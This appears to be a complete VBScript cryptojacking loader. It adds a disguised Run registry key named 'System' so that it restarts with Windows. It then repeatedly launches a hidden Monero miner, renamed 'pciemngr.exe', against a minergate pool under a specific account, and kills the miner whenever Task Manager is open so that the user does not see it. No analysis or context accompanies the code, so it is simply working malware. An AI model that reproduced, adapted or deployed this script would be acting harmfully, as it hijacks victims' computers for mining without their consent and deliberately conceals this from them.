Set WshShell = CreateObject("WScript.Shell") 
Const wbemFlagReturnImmediately = &h10
Const wbemFlagForwardOnly = &h20
Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Processor", "WQL",wbemFlagReturnImmediately + wbemFlagForwardOnly)
WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System",WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\updater.vbs", "REG_SZ"
do
WScript.Sleep 500
Set taskcolitem = objWMIService.ExecQuery("Select * from Win32_Process")
taskmgrisrun=false
For Each objItem in taskcolitem
If objItem.Name="Taskmgr.exe" OR objItem.Name="taskmgr.exe" Then
taskmgrisrun=True
Exit For
End If
Next
Running = False
Set colItems = objWMIService.ExecQuery("Select * from Win32_Process")
For Each objItem in colItems
If objItem.Name = "pciemngr.exe" Then
Running = True
Set thisprocess=objItem
Exit For
End If
Next
If taskmgrisrun Then
If Running Then
thisprocess.Terminate
End if
If Not Running Then
Running=True
End if
End if
If Not Running Then
WScript.Sleep 500
WshShell.Run WshShell.ExpandEnvironmentStrings("%APPDATA%")&"\Aledaxo\pciemngr.exe -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u manvill1an@yandex.ru -p x",0
End if
Loop